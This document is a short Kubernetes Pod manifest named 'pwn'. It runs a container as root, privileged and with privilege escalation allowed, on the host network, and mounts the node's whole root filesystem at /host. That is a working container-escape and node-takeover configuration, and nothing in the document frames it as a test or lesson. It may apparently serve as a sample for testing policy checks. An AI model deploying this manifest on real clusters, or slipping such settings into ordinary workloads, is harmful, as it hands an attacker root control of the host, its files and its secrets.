apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  containers:
  - name: app
    image: nginx:latest
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - mountPath: /host
      name: host
  securityContext:
    runAsUser: 0
  hostNetwork: true
  volumes:
  - name: host
    hostPath:
      path: /
